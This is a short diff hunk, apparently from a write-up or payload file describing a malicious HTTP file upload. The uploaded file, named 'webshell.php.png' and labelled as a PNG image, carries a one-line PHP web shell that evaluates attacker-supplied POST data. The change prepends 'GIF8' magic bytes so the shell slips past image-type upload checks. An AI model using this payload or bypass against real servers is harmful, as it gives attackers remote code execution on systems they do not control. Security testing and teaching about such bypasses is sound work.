@@ -255,7 +255,7 @@ Connection: close
 Content-Disposition: form-data; name="file"; filename="webshell.php.png"
 Content-Type: image/png
 
-<?php @eval($_POST['shell']) ?>
+GIF8<?php @eval($_POST['shell']) ?>
 ------WebKitFormBoundaryjq6FmbKJJ3r1PCcW--
 
 
